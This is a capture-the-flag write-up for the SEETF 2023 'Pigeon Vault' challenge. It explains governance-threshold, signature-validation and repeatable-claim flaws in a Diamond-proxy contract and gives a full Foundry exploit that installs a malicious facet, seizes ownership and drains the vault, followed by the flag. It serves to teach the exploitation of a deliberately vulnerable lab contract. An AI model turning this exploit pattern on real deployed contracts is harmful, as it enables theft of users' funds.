---
title: Blockchain - Pigeon Vault
description: 2023 | SEETF | Smart Contracts
tags:
    - smart contract
    - diamond
    - proxy
    - data validation
    - ecrecover
---

## 题目

rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system.

Find out a way to steal his funds before he discovers any flaws in his implementation.

Blockchain has a block time of 10: https://book.getfoundry.sh/reference/anvil/

> nc win.the.seetf.sg 8552

[:material-download: `pigeon_vault.zip`](static/pigeon_vault.zip)

## 解题思路

- 需要成为 diamond 合约的所有者且持有不少于 3000 ether (即清空 `pigeonDiamond` 的余额)

    ```js
    function isSolved() external view returns (bool) {
        return (IOwnershipFacet(address(pigeonDiamond)).owner() == msg.sender && msg.sender.balance >= 3000 ether);
    }
    ```

- `PigeonDiamond` 采用了 Diamond Storage 和 App Storage 混合的存储模式
- 先了解一下应用层面切面的功能
    - `DAOFacet`
        - `submitProposal()` 由于 `isUserGovernance()` 阈值设置存在问题，任意用户可以提交操作切面的提案

            ```js
            function isUserGovernance(address _user) internal view returns (bool) {
                uint256 totalSupply = s.totalSupply;
                uint256 userBalance = LibDAO.getCurrentVotes(_user);
                uint256 threshold = (userBalance * 100) / totalSupply;
                return userBalance >= threshold;    // If userBalance equals 0, then the threshold is 0 and satisfies this condition
            }
            ```

        - `executeProposal()` 执行指定提案
            - 提案的 `forVotes` 需要大于 `againstVotes` 以及十分之一的 `totalSupply`
        - `castVoteBySig()` 验证签名并为提案投票
            - 只检查 `signer` 不为 `address(0)`，因此可以是无效签名
            - 票数为 `msg.sender`（而不是 `signer`）在 `proposal.startBlock` 前最后一次记录的票数

    - `FTCFacet` FeatherCoin，与 [Diamond Heist](./diamond_heist.md#解题思路) 类似的模式
    - `OwnershipFacet` 使用 Diamond 存储模式管理 `contractOwner`
    - `PigeonVaultFacet`
        - `emergencyWithdraw()` owner 可以取出合约所有的 ether

- 另外，在 `Setup` 中，由于没有更新 `claimed`，任何人可以调用任意次 `claim()` 来获得 `FTC`

    ```js
    function claim() external {
        require(!claimed, "You already claimed");

        bool success = IERC20(address(pigeonDiamond)).transfer(msg.sender, 10_000 ether);
        require(success, "Failed to send");
    }
    ```

- 比较简单直接的方法是调用 11 次 `claim()` 来获取达到执行提案阈值的票数，也可通过 `castVoteBySig()` 进行多次投票

### Exploit

```js
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "../src/Setup.sol";
import "../src/libraries/LibDiamond.sol";
import "../src/interfaces/IDAOFacet.sol";

interface IFTCFacet {
    function delegate(address _delegatee) external;
}

contract HackFacet {
    function exploit(address player) external {
        LibDiamond.setContractOwner(player);
        payable(player).transfer(address(this).balance);
    }
}

contract SolveTest is Test {

    Setup setup;
    address pigeonDiamond;

    uint constant privKey = 0xdead;
    address immutable hacker = vm.addr(privKey);

    function setUp() public {
        setup = new Setup{value: 3000 ether}();
        pigeonDiamond = address(setup.pigeonDiamond());
    }

    function testSolve() public {
        vm.startPrank(hacker);

        address hackFacet = address(new HackFacet());
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = bytes4(keccak256("exploit()"));
        IDiamondCut.FacetCut memory diamondCut = IDiamondCut.FacetCut({
            facetAddress: hackFacet,
            action: IDiamondCut.FacetCutAction.Add,
            functionSelectors: selectors
        });

        IFTCFacet(pigeonDiamond).delegate(hacker);
        for (uint8 i; i < 11; ++i) {
            setup.claim();
        }

        uint proposalId = IDAOFacet(pigeonDiamond).submitProposal(hackFacet, abi.encodeWithSignature("exploit(address)", hacker), diamondCut);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, keccak256("\x19Ethereum Signed Message:\n32"));
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.roll(2);

        IDAOFacet(pigeonDiamond).castVoteBySig(proposalId, true, signature);

        vm.roll(10);

        IDAOFacet(pigeonDiamond).executeProposal(proposalId);
        
        assert(setup.isSolved());
        vm.stopPrank();
    }
}
```

### Flag

> SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n’t_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}